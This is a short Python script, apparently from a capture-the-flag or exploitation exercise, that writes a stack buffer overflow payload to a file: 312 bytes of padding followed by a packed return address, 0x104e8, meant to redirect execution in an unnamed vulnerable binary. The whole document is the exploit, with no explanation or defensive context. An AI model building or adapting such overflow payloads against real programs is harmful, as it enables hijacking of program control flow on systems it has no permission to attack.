import struct

padding = 312
target  = 0x104e8        

payload = b'A' * padding + struct.pack('<I', target)

with open('payload', 'wb') as f:
    f.write(payload)
